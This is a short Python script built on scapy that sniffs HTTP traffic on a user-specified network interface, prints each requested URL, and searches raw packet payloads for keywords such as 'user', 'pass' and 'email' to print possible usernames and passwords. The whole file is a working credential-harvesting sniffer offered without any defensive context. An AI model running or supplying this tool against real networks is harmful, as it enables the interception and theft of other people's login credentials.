#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http
import optparse


def arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="Specify The Interface")
    (options, arguments) = parser.parse_args()
    if not options.interface:
        parser.error("[-] Specify The Interface, --help for more info")
    else:
        return options.interface


def sniff(interface):
    # Use filter function to filter acc. ex: filter = port 21
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["name", "uname", "user", "login", "username", "usernames", "pass", "passwords", "password", "id",
                    "email", "mail", "phonenumber", "number"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request > " + str(url))
        login_info = get_login(packet)
        if login_info:
            print("\n\n----------------------------------------------")
            print("\n\n[+] Possible username/password > " + str(login_info))
            print("\n\n----------------------------------------------\n\n")


interface = arguments()
sniff(interface)
